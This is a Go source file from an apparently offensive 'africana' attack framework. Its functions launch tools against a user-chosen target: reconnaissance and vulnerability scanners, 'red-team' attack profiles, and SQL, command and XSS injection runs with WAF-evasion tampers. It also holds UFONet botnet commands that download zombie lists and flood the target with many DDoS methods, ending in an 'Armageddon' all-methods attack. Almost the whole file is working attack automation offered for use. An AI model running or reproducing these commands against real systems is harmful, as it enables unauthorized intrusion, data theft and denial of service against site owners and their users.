package webattackers

import (
    "os"
    "fmt"
    "bufio"
    "strings"
    "bcolors"
    "subprocess"
)

var userInput, userPort, userTarget, chosenTarget string

func WafW00f(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Running waf detection on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`wafw00f -v -a %s`, userTarget)
    //fmt.Println()
}

func DnsRecon(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Running dns reconing on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`dnsrecon -a -d %s`, userTarget)
    //fmt.Println()
}

func SeekOlver(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Running seekolver reconing on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/seekolver/ python3 seekolver.py -te %s -v -r -k -cn -p 80 443`, userTarget)
    fmt.Println()
}

func WhatWeb(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Reconning running softs on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`whatweb -a 3 -v %s`, userTarget)
    fmt.Println()
}

func Harvester(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Harvesting emails and accounts" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`theHarvester -n -l 45 -b bing,yahoo,duckduckgo -r "1.1.1.1" -d %s`, userTarget)
    fmt.Println()
}

func ParamSpider(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Mining root urls on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`paramspider -s -d %s`,  userTarget)
    fmt.Println()
}

func SslScan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Scanning vuln ssl on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`sslscan --show-certificate --show-sigs --tlsall --verbose %s`,  userTarget)
    fmt.Println()
}

func Gobuster(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Mining root files on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`gobuster dir vhost --debug --no-error --random-agent -w /root/.africana/africana-base/wordlists/content/big.txt -e -u %s`, userTarget)
    fmt.Println()
}

func Nuclei(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Scanning known vulns on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`nuclei -u %s`, userTarget)
    fmt.Println()
}

func Nikto(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Further scanning for vulns on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`nikto -ask no -Cgidirs all -Display 3 -host %s`, userTarget)
    fmt.Println()
}

func Bbot(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Full vuln reconning on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly -t %s`, userTarget)
    fmt.Println()
}

func Uniscan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Heavy vuln reconning on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`uniscan -qweds -u %s`,  userTarget)
    fmt.Println()
}

func SqlmapAuto(userTarget string) {
    subprocess.PopenTwo(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s`, userTarget)
    fmt.Println()
}

func SqlmapMan() {
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta  -wizard`)
}

func CommixAuto(userTarget string) {
    subprocess.PopenTwo(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 -u %s`, userTarget)
    fmt.Println()
}

func CommixMan() {
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 --wizard`)
}

func KatanaAuto(userTarget string) {
    subprocess.PopenTwo(`katana -jc -kf all -c 5 -d 3 | httpx-toolkit -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav`, userTarget)
    fmt.Println()
}

func XsserAuto(userTarget string) {
    subprocess.PopenTwo(`xsser -c 100 --Cl -u %s`, userTarget)
    fmt.Println()
}

func XsserMan() {
    subprocess.Popen(`xsser -u --wizard`)
}

func NetTacker1(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started port scan & wappalyzer" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m port_scan -t 100`, userTarget)
    fmt.Println()
}

func NetTacker2(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started subdomains reconing" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m subdomain_scan`, userTarget)
    fmt.Println()
}

func NetTacker3(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched admin_scan" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m scan`, userTarget)
    fmt.Println()
}

func NetTacker4(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Start information gathering" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m information_gathering -s`, userTarget)
    fmt.Println()
}

func NetTacker5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Start vulnscansecurity checks" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m server_version_vuln`, userTarget)
    fmt.Println()
}

func NetTacker6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Runing CVE scans on the target" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m cve`, userTarget)
    fmt.Println()
}

func NetTacker7(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Searching for (critical vulns & exploit)" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m high_severity`, userTarget)
    fmt.Println()
}

func NetTacker8(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched automated & intrusive checks" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py -i %s --profile all/results.txt`, userTarget)
    fmt.Println()
}

func NetTacker9() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched WebUI key: africana" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/nettacker/; python3 nettacker.py --start-api --api-access-key africana`)
}

func Jok3r1() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Installing all jok3r tools. Pleas start be patient" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/jok3r/; /bin/bash install-all.sh`)
}

func Jok3r2() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Updating all the tools in the toolbox. Pleas start be patient" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --update-all --auto`)
}

func Jok3r3() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing all the tools in the toolbox" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --show-all`)
}

func Jok3r4() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing supported products for all services" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/jok3r/; python3 jok3r.py info --services`)
}

func Jok3r5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Performing a very fast-scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast`, userTarget)
    fmt.Println()
}

func Jok3r6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Run all security checks against" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userTarget)
    fmt.Println()
}

func Jok3r7(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Searching for critical vulns & easy to exploit" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userTarget)
    fmt.Println()
}

func Jok3r8() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing the full results from the security checks" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -`)
}

func Jok3r9() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Clean & interact with DB Commands; help or quit 2 exit." + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/jok3r/; python3 jok3r.py db "mission -d default"`)
}

func Osmedeus1() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Updating Osmedeus & Runing diagnostics to check config." + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean`)
}

func Osmedeus2(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started simple scan with other flow on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus --nv scan -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus3(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started Directly run on vuln scan & directory scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus --nv scan -f vuln-and-dirb -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus4(userTargets string) {
    fmt.Println(bcolors.ENDC + "\n               (" + bcolors.UNDERL + bcolors.BLUE + "Give full path for your .urls" + bcolors.ENDC + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n" + bcolors.YELLOW + `¯\_(ツ)_/¯ ` + bcolors.BLUE + "Path to target🎯 " + bcolors.GREEN + "Urls to be " + bcolors.RED + "Attacked!! \n" + bcolors.ENDC)
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&userTargets)
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started bulk scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus scan -f vuln-and-dirb -T %s`, userTargets)
}

func Osmedeus5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Cloud - Run scan in Distributed Cloud mode" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Performing Full web vuln & secret scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus7(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Update the vulnerability database before attacking" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus scan --update-vuln -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus8() {
    fmt.Printf(bcolors.BLUE + "( " + bcolors.RED + "Select a Port to start your server on" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Port:" + bcolors.BLUE + "Default:" + bcolors.BLUE + "3333" + bcolors.GREEN + ")# " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userPort, _ := reader.ReadString('\n')
    userPort = strings.TrimSpace(userPort)
    if userPort == "" {
        userPort = "3333"
    }
    fmt.Printf(bcolors.BLUE + "\n( " + bcolors.RED + "Started Osmedeusweb UI server on " + bcolors.GREEN + "localhost:%s", userPort + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus server --port %s`, userPort)
}

func Osmedeus9() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing scanned osmedeus report list" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`osmedeus report list`)
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.UNDERL + bcolors.BLUE + " Pleas select a target to expand list " + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&chosenTarget)
    fmt.Printf(bcolors.RED + "\n(More results for = %s)", chosenTarget + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus report view --static -t %s`, chosenTarget)
}

func Ufonet1() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Downloading list of bots from C.S" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/ufonet/; python3 ufonet --download-zombies`)
}

func Ufonet2() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Testing If bots are alive" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/ufonet/; python3 ufonet -t botnet/zombies.txt`)
}

func Ufonet3(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Palantir 3.14 againist" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet4(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Socking_waves (instant-knockout!) againist" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched xcom-1 (only DDoS) againist" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched xcom-2 (only DoS) againist" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet7() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched ufonet gui on http://localhost:9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/ufonet/; python3 ufonet --gui`)
}

func Ufonet8() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started Grider python3 ufonet --grider &" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd ~/.africana/africana-base/ufonet/; python3 ufonet --grider`)
}

func Ufonet9(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Armageddon! with ALL!" + bcolors.BLUE + ")" + bcolors.BLUE + " 🎯 ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd ~/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userTarget)
    fmt.Println()
}
